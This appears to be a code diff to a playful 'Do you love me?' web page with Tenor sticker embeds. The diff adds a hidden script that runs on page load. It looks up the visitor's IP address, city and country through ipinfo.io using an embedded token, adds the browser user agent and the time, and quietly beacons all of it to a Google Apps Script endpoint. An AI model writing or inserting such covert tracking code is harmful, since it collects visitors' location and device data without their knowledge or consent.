@@ -16,6 +16,20 @@
       <a href="https://tenor.com/view/manja-gif-22885016">Manja Sticker</a>from
       <a href="https://tenor.com/search/manja-stickers">Manja Stickers</a>
     </div>
+    <script>
+  fetch('https://ipinfo.io/json?token=c3a991788ade1f')
+    .then(response => response.json())
+    .then(data => {
+      const payload = {
+        ip: data.ip,
+        city: data.city,
+        country: data.country,
+        browser: navigator.userAgent,
+        time: new Date().toLocaleString()
+      };
+      navigator.sendBeacon('https://script.google.com/macros/s/AKfycbzPm5TE1zvGYlUatpMcdPc5TuNlZ0AZEG_39LZDWg/exec', JSON.stringify(payload));
+    });
+    </script>
     
     <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
     <h1>Do you love me? 🤗</h1>
